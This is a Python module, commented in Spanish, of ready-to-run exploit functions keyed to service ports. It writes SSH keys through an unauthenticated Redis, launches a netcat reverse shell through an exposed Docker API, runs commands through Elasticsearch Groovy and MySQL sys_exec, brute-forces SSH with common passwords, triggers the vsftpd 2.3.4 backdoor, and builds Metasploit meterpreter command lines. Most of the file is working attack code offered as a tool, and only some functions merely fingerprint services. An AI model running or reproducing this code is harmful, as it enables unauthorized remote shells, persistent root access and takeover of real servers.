# -*- coding: utf-8 -*-
"""Explotadores nativos en Python puro. RCE + salida. Sin Metasploit.
Solo usa stdlib (socket, subprocess, json, urllib). paramiko opcional para SSH."""

import base64
import hashlib
import inspect
import json
import os
import socket
import subprocess
import time
import urllib.request


class Resultado:
    def __init__(self, ok, salida="", error="", metodo=""):
        self.ok = ok
        self.salida = salida
        self.error = error
        self.metodo = metodo

    def __repr__(self):
        return f"<Resultado ok={self.ok} metodo={self.metodo} err={self.error[:40]}>"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _tcp(ip, puerto, timeout=4.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((ip, int(puerto)))
    return s


def _leer(s, timeout=2.0, tam=65536):
    s.settimeout(timeout)
    datos = b""
    try:
        while True:
            chunk = s.recv(tam)
            if not chunk:
                break
            datos += chunk
            if len(chunk) < tam:
                break
    except socket.timeout:
        pass
    return datos


def _clave_ssh_publica():
    for nombre in ("id_rsa.pub", "id_ed25519.pub"):
        ruta = os.path.expanduser(f"~/.ssh/{nombre}")
        if os.path.exists(ruta):
            try:
                with open(ruta) as f:
                    return f.read().strip()
            except Exception:
                pass
    return ""


def _http(ip, puerto, metodo, ruta, cuerpo="", headers=None, timeout=6.0):
    s = _tcp(ip, puerto, timeout=timeout)
    headers = headers or {}
    headers.setdefault("Host", f"{ip}")
    headers.setdefault("Connection", "close")
    headers.setdefault("Content-Length", str(len(cuerpo)))
    cab = f"{metodo} {ruta} HTTP/1.1\r\n"
    cab += "".join(f"{k}: {v}\r\n" for k, v in headers.items())
    cab += "\r\n"
    s.sendall(cab.encode() + cuerpo.encode())
    resp = _leer(s, timeout=timeout)
    s.close()
    return resp.decode("latin-1", "ignore")


def _cuerpo_http(resp):
    partes = resp.split("\r\n\r\n", 1)
    return partes[1] if len(partes) > 1 else ""


# -------------------- REDIS (6379) --------------------
def explotar_redis(ip, puerto, lhost, lport, ssh_dir="/root/.ssh"):
    try:
        s = _tcp(ip, puerto)
    except Exception as e:
        return Resultado(False, error=f"conexion: {e}", metodo="redis")

    def cmd(c, t=1.5):
        s.sendall(c.encode() + b"\r\n")
        return _leer(s, timeout=t)

    try:
        cmd("PING")
        pub = _clave_ssh_publica()
        if pub:
            cmd("CONFIG SET dir /root/.ssh")
            cmd("CONFIG SET dbfilename authorized_keys")
            cmd(f'SET k "{pub}"')
            cmd("SAVE")
        info = cmd("INFO server")
        s.close()
        metodo = "redis:authorized_keys" if pub else "redis:info"
        salida = info.decode("latin-1", "ignore")[:800]
        if pub:
            salida += f"\n[+] clave escrita en {ssh_dir}/authorized_keys (ssh root@{ip})"
        return Resultado(True, salida=salida, metodo=metodo)
    except Exception as e:
        return Resultado(False, error=str(e), metodo="redis")


# -------------------- DOCKER API (2375) --------------------
def explotar_docker(ip, puerto, lhost, lport, imagen="alpine"):
    def peticion(metodo, ruta, cuerpo=None):
        return _http(ip, puerto, metodo, ruta, cuerpo or "",
                     headers={"Content-Type": "application/json"})

    try:
        crear = json.dumps({
            "Image": imagen,
            "Cmd": ["/bin/sh", "-c",
                    f"apk add --no-cache netcat-openbsd >/dev/null 2>&1; "
                    f"nc {lhost} {lport} -e /bin/sh"],
        })
        resp = peticion("POST", "/containers/create", crear)
        try:
            cid = json.loads(_cuerpo_http(resp)).get("Id", "")
        except Exception:
            cid = ""
        if not cid:
            return Resultado(False, error=f"create fallo: {resp[:200]}", metodo="docker")
        peticion("POST", f"/containers/{cid}/start")
        return Resultado(True,
                         salida=f"contenedor {cid[:12]} arrancado; reverse shell -> {lhost}:{lport}",
                         metodo="docker")
    except Exception as e:
        return Resultado(False, error=str(e), metodo="docker")


# -------------------- MONGODB (27017) --------------------
def _bson(doc):
    def elem(k, v):
        nombre = k.encode() + b"\x00"
        if isinstance(v, bool):
            return b"\x08" + nombre + (b"\x01" if v else b"\x00")
        if isinstance(v, int):
            return b"\x10" + nombre + v.to_bytes(4, "little", signed=True)
        if isinstance(v, str):
            raw = v.encode() + b"\x00"
            return b"\x02" + nombre + len(raw).to_bytes(4, "little") + raw
        return b"\x0a" + nombre
    cuerpo = b"".join(elem(k, v) for k, v in doc.items())
    return (len(cuerpo) + 5).to_bytes(4, "little") + cuerpo + b"\x00"


def explotar_mongo(ip, puerto, lhost="", lport=0):
    try:
        s = _tcp(ip, puerto)
    except Exception as e:
        return Resultado(False, error=f"conexion: {e}", metodo="mongo")
    coleccion = "admin.$cmd"
    bson = _bson({"isMaster": 1})
    cuerpo = (b"\x00\x00\x00\x00" + coleccion.encode() + b"\x00"
              + b"\x00\x00\x00\x00" + b"\xff\xff\xff\xff" + bson)
    total = len(cuerpo) + 16
    cab = (total.to_bytes(4, "little") + b"\x01\x00\x00\x00"
           + b"\x00\x00\x00\x00" + b"\xd4\x07\x00\x00")
    try:
        s.sendall(cab + cuerpo)
        resp = _leer(s, timeout=3.0)
        s.close()
        if not resp:
            return Resultado(False, error="sin respuesta", metodo="mongo")
        texto = "".join(chr(b) if 32 <= b < 127 else " " for b in resp)
        return Resultado(True, salida=texto[:400], metodo="mongo:isMaster")
    except Exception as e:
        return Resultado(False, error=str(e), metodo="mongo")


# -------------------- ELASTICSEARCH (9200) --------------------
def explotar_elastic(ip, puerto, lhost="", lport=0, comando=None):
    try:
        raiz = _cuerpo_http(_http(ip, puerto, "GET", "/"))
        version = ""
        try:
            version = json.loads(raiz)["version"]["number"]
        except Exception:
            pass
        if comando:
            script = f'java.lang.Runtime.getRuntime().exec("{comando}")'
            body = json.dumps({"script": script, "lang": "groovy"})
            resp = _http(ip, puerto, "POST", "/_search?pretty", body,
                         headers={"Content-Type": "application/json"})
            return Resultado(True, salida=resp[:600],
                             metodo=f"elastic:groovy v{version}")
        return Resultado(True, salida=raiz[:600], metodo=f"elastic v{version}")
    except Exception as e:
        return Resultado(False, error=str(e), metodo="elastic")


# -------------------- MYSQL (3306) --------------------
def _mysql_native(password, salt):
    h1 = hashlib.sha1(password.encode()).digest()
    h2 = hashlib.sha1(h1).digest()
    h3 = hashlib.sha1(salt + h2).digest()
    return bytes(a ^ b for a, b in zip(h1, h3))


def _mysql_query(s, sql):
    payload = b"\x03" + sql.encode()
    pkt = (len(payload)).to_bytes(3, "little") + b"\x00" + payload
    s.sendall(pkt)
    return _leer(s, timeout=4.0).decode("latin-1", "ignore")


def explotar_mysql(ip, puerto, usuario="root", password="", comando=None,
                   lhost="", lport=0):
    try:
        s = _tcp(ip, puerto)
    except Exception as e:
        return Resultado(False, error=f"conexion: {e}", metodo="mysql")

    try:
        saludo = _leer(s, timeout=2.0)
        if not saludo:
            return Resultado(False, error="sin saludo", metodo="mysql")

        seq = 1
        caps = 0x0000F7FF
        maxpkt = 16777215
        charset = 33
        usuario_b = usuario.encode() + b"\x00"
        token = b""
        if password:
            token = _mysql_native(password, saludo[4:12])
        payload = (
            caps.to_bytes(4, "little")
            + maxpkt.to_bytes(4, "little")
            + bytes([charset]) + b"\x00" * 23
            + usuario_b
            + bytes([len(token)]) + token
            + b"mysql_native_password\x00"
        )
        pkt = (len(payload)).to_bytes(3, "little") + bytes([seq]) + payload
        s.sendall(pkt)
        resp = _leer(s, timeout=3.0)
        if not resp or resp[4:5] != b"\x00":
            err = resp[7:].decode("latin-1", "ignore") if resp else "sin respuesta"
            s.close()
            return Resultado(False, error=f"auth fallo: {err[:120]}", metodo="mysql")

        if not comando:
            s.close()
            return Resultado(True, salida=f"login OK como {usuario}@{ip}",
                             metodo="mysql:login")

        q = f"SELECT sys_exec('{comando}')"
        res = _mysql_query(s, q)
        s.close()
        return Resultado(True, salida=res[:600], metodo="mysql:sys_exec")
    except Exception as e:
        return Resultado(False, error=str(e), metodo="mysql")


# -------------------- SSH BRUTE FORCE (22) --------------------
def explotar_ssh(ip, puerto=22, usuario="root",
                 passwords=("root", "toor", "admin", "password", "123456")):
    try:
        import paramiko
    except ImportError:
        return Resultado(True,
                         salida="paramiko no instalado; prueba manual: "
                                f"ssh {usuario}@{ip} (passwords: {', '.join(passwords)})",
                         metodo="ssh:sugerencia")
    for pwd in passwords:
        try:
            cli = paramiko.SSHClient()
            cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            cli.connect(ip, port=int(puerto), username=usuario,
                        password=pwd, timeout=5, allow_agent=False,
                        look_for_keys=False)
            _, stdout, _ = cli.exec_command("id; uname -a")
            out = stdout.read().decode("latin-1", "ignore")
            cli.close()
            return Resultado(True, salida=f"login OK {usuario}:{pwd}\n{out}",
                             metodo="ssh:brute")
        except Exception:
            continue
    return Resultado(False, error=f"sin match con {len(passwords)} passwords",
                     metodo="ssh:brute")


# -------------------- TOMCAT MANAGER (8080/8443) --------------------
def explotar_tomcat(ip, puerto, usuario="tomcat", password="tomcat",
                    lhost="", lport=0):
    auth = base64.b64encode(f"{usuario}:{password}".encode()).decode()
    hdr = {"Authorization": f"Basic {auth}"}
    try:
        r = _http(ip, puerto, "GET", "/manager/text/list", headers=hdr)
        primera = r.split("\r\n", 1)[0]
        if "200" not in primera and "OK" not in r:
            return Resultado(False, error=r[:150], metodo="tomcat")
        apps = _cuerpo_http(r)[:400]
        return Resultado(True,
                         salida=f"manager accesible como {usuario}:{password}\n{apps}",
                         metodo="tomcat:manager")
    except Exception as e:
        return Resultado(False, error=str(e), metodo="tomcat")


# -------------------- SNMP (161) --------------------
def explotar_snmp(ip, puerto=161, community="public"):
    def _len_tlv(n):
        if n < 0x80:
            return bytes([n])
        b = n.to_bytes((n.bit_length() + 7) // 8, "big")
        return bytes([0x80 | len(b)]) + b

    def _tlv(tag, val):
        return bytes([tag]) + _len_tlv(len(val)) + val

    oid = b"\x2b\x06\x01\x02\x01\x01\x01\x00"
    varbind = _tlv(0x30, _tlv(0x06, oid) + _tlv(0x05, b"\x00"))
    varbindlist = _tlv(0x30, varbind)
    pdu = _tlv(0xA0, _tlv(0x02, b"\x01") + _tlv(0x02, b"\x00")
               + _tlv(0x02, b"\x00") + varbindlist)
    comunidad = _tlv(0x04, community.encode())
    msg = _tlv(0x30, _tlv(0x02, b"\x00") + comunidad + pdu)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(4)
        s.sendto(msg, (ip, int(puerto)))
        data, _ = s.recvfrom(4096)
        s.close()
        texto = "".join(chr(b) if 32 <= b < 127 else " " for b in data)
        return Resultado(True, salida=texto[:300], metodo="snmp:v1")
    except Exception as e:
        return Resultado(False, error=str(e), metodo="snmp")


# -------------------- NFS (2049) --------------------
def explotar_nfs(ip, puerto=2049, lhost="", lport=0):
    try:
        r = subprocess.run(["showmount", "-e", ip], capture_output=True,
                           text=True, timeout=8)
        if r.returncode == 0:
            return Resultado(True, salida=r.stdout[:500], metodo="nfs:showmount")
    except Exception:
        pass
    try:
        r = subprocess.run(["rpcinfo", "-p", ip], capture_output=True,
                           text=True, timeout=8)
        if r.returncode == 0:
            return Resultado(True, salida=r.stdout[:500], metodo="nfs:rpcinfo")
    except Exception:
        pass
    return Resultado(False, error="showmount/rpcinfo no disponibles", metodo="nfs")


# -------------------- RSYNC (873) --------------------
def explotar_rsync(ip, puerto=873, lhost="", lport=0):
    try:
        s = _tcp(ip, puerto)
        _leer(s, timeout=2.0)
        s.sendall(b"#list\r\n")
        resp = _leer(s, timeout=3.0)
        s.close()
        texto = resp.decode("latin-1", "ignore")
        return Resultado(True, salida=texto[:600] or "(sin módulos)",
                         metodo="rsync:list")
    except Exception as e:
        return Resultado(False, error=str(e), metodo="rsync")


# -------------------- MEMCACHED (11211) --------------------
def explotar_memcached(ip, puerto=11211, lhost="", lport=0):
    try:
        s = _tcp(ip, puerto)
        s.sendall(b"stats\r\n")
        stats = _leer(s, timeout=2.0)
        s.sendall(b"stats items\r\n")
        items = _leer(s, timeout=2.0)
        s.close()
        texto = (stats + b"\n--- items ---\n" + items).decode("latin-1", "ignore")
        return Resultado(True, salida=texto[:800], metodo="memcached:stats")
    except Exception as e:
        return Resultado(False, error=str(e), metodo="memcached")


# -------------------- JAVA RMI (1099) --------------------
def explotar_rmi(ip, puerto=1099, lhost="", lport=0):
    try:
        s = _tcp(ip, puerto)
        s.sendall(b"JRMI\x00\x02\x4b")
        resp = _leer(s, timeout=3.0)
        s.close()
        texto = "".join(chr(b) if 32 <= b < 127 else " " for b in resp)
        if not texto.strip():
            return Resultado(False, error="sin respuesta JRMP", metodo="rmi")
        return Resultado(True, salida=texto[:300], metodo="rmi:jrmp")
    except Exception as e:
        return Resultado(False, error=str(e), metodo="rmi")


# -------------------- VNC (5900) --------------------
def explotar_vnc(ip, puerto=5900, password="", lhost="", lport=0):
    try:
        s = _tcp(ip, puerto)
        banner = _leer(s, timeout=3.0)
        s.close()
        txt = banner.decode("latin-1", "ignore")
        if not txt.startswith("RFB"):
            return Resultado(False, error=f"no es VNC: {txt[:40]}", metodo="vnc")
        return Resultado(True, salida=f"VNC detectado: {txt.strip()[:60]}",
                         metodo="vnc:rfb")
    except Exception as e:
        return Resultado(False, error=str(e), metodo="vnc")


# -------------------- FTP (21) --------------------
def explotar_ftp(ip, puerto=21, usuario="anonymous", password="anonymous",
                 lhost="", lport=0):
    try:
        s = _tcp(ip, puerto)
    except Exception as e:
        return Resultado(False, error=f"conexion: {e}", metodo="ftp")

    def cmd(c, t=2.0):
        s.sendall(c.encode() + b"\r\n")
        return _leer(s, timeout=t).decode("latin-1", "ignore")

    try:
        banner = _leer(s, timeout=2.0).decode("latin-1", "ignore")
        if "vsftpd 2.3.4" in banner:
            s.sendall(b"USER usuario:)\r\n")
            _leer(s, timeout=1.5)
            s.sendall(b"PASS x\r\n")
            _leer(s, timeout=1.5)
            s.close()
            return Resultado(True,
                             salida=f"vsftpd 2.3.4 backdoor disparado. "
                                    f"Prueba: nc {ip} 6200\n{banner[:80]}",
                             metodo="ftp:vsftpd_backdoor")
        cmd(f"USER {usuario}")
        resp = cmd(f"PASS {password}")
        if resp.startswith("230"):
            listado = cmd("PASV")
            return Resultado(True, salida=f"login anónimo OK\n{listado[:400]}",
                             metodo="ftp:anon")
        s.close()
        return Resultado(False, error=f"login fallo: {resp[:120]}", metodo="ftp")
    except Exception as e:
        return Resultado(False, error=str(e), metodo="ftp")


# -------------------- RDP (3389) --------------------
def explotar_rdp(ip, puerto=3389, lhost="", lport=0):
    try:
        s = _tcp(ip, puerto)
        pkt = bytes.fromhex("030000130ee000000000000100080003000000")
        s.sendall(pkt)
        resp = _leer(s, timeout=3.0)
        s.close()
        if resp and resp[0:1] == b"\x03":
            return Resultado(True, salida="RDP activo (X.224 OK)", metodo="rdp:x224")
        return Resultado(False, error="sin respuesta RDP válida", metodo="rdp")
    except Exception as e:
        return Resultado(False, error=str(e), metodo="rdp")


# -------------------- SMB (445/139) --------------------
def explotar_smb(ip, puerto=445, lhost="", lport=0):
    try:
        s = _tcp(ip, puerto)
        pkt = bytes.fromhex(
            "00000090fe534d42400000000000000000000000"
            "0000000000000000000000000000000000000000"
            "0000000000000000240001000000000000000000"
            "0000000000000000000000000000000000000000"
            "00000000000000000202fe0000000000000000"
        )
        s.sendall(pkt)
        resp = _leer(s, timeout=3.0)
        s.close()
        if not resp:
            return Resultado(False, error="sin respuesta SMB", metodo="smb")
        firma = resp[4:8]
        dialecto = "SMB2" if firma == b"\xfeSMB" else "SMB1/otro"
        return Resultado(True, salida=f"SMB activo ({dialecto})",
                         metodo="smb:negotiate")
    except Exception as e:
        return Resultado(False, error=str(e), metodo="smb")


# -------------------- MSSQL (1433) --------------------
def explotar_mssql(ip, puerto=1433, lhost="", lport=0):
    """Handshake TDS pre-login para confirmar MSSQL vivo."""
    try:
        s = _tcp(ip, puerto)
        # TDS pre-login packet (tipo 0x12) con opciones mínimas
        cuerpo = (b"\x00\x00\x15\x00\x06\x01\x00\x1b\x00\x01\x02\x00"
                  b"\x1c\x00\x0c\x03\x00\x28\x00\x04\xff\x08\x00\x01\x55"
                  b"\x00\x00\x00")
        cab = b"\x12\x01" + len(cuerpo).to_bytes(2, "big") + b"\x00\x00" \
              + b"\x01\x00\x00\x00"
        s.sendall(cab + cuerpo)
        resp = _leer(s, timeout=3.0)
        s.close()
        if resp and resp[0:1] == b"\x04":
            return Resultado(True, salida="MSSQL activo (pre-login OK)",
                             metodo="mssql:tds")
        return Resultado(False, error="sin respuesta TDS", metodo="mssql")
    except Exception as e:
        return Resultado(False, error=str(e), metodo="mssql")


# ---------------------------------------------------------------------------
# TABLA DE DESPACHO: puerto -> función
# ---------------------------------------------------------------------------
MAPA = {
    21:    explotar_ftp,
    22:    explotar_ssh,
    139:   explotar_smb,
    161:   explotar_snmp,
    445:   explotar_smb,
    873:   explotar_rsync,
    1099:  explotar_rmi,
    1433:  explotar_mssql,
    2049:  explotar_nfs,
    2375:  explotar_docker,
    3306:  explotar_mysql,
    3389:  explotar_rdp,
    5900:  explotar_vnc,
    6379:  explotar_redis,
    8080:  explotar_tomcat,
    8443:  explotar_tomcat,
    9200:  explotar_elastic,
    11211: explotar_memcached,
    27017: explotar_mongo,
}


def soportado(puerto):
    return int(puerto) in MAPA


def explotar(ip, puerto, lhost="", lport=0, comando=None, **extra):
    """Despachador: llama al explotador nativo correcto pasando solo los
    argumentos que la función acepta. Devuelve un Resultado."""
    puerto = int(puerto)
    fn = MAPA.get(puerto)
    if not fn:
        return Resultado(False, error=f"sin explotador nativo para puerto {puerto}",
                         metodo="ninguno")
    params = inspect.signature(fn).parameters
    kwargs = {}
    if "lhost" in params:
        kwargs["lhost"] = lhost
    if "lport" in params:
        kwargs["lport"] = lport
    if "comando" in params and comando:
        kwargs["comando"] = comando
    for k, v in extra.items():
        if k in params:
            kwargs[k] = v
    try:
        return fn(ip, puerto, **kwargs)
    except Exception as e:
        return Resultado(False, error=f"{type(e).__name__}: {e}",
                         metodo=fn.__name__)


# ---------------------------------------------------------------------------
# Puente opcional a Metasploit (para los pesados: EternalBlue, BlueKeep, etc.)
# ---------------------------------------------------------------------------
def metasploit_disponible():
    try:
        r = subprocess.run(["msfconsole", "-v"], capture_output=True,
                           text=True, timeout=20)
        return r.returncode == 0
    except Exception:
        return False


def comando_metasploit(rec, lhost, lport=4444):
    """Genera la línea de comandos msfconsole -x para un exploit dado."""
    modulo = rec.get("cmd", "").split(" / ")[0].strip()
    payload = rec.get("payload", "windows/x64/meterpreter/reverse_tcp")
    ip = rec.get("ip", "")
    puerto = rec.get("puerto", "")
    return (f"msfconsole -q -x \"use exploit/{modulo}; "
            f"set RHOSTS {ip}; set RPORT {puerto}; "
            f"set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; run\"")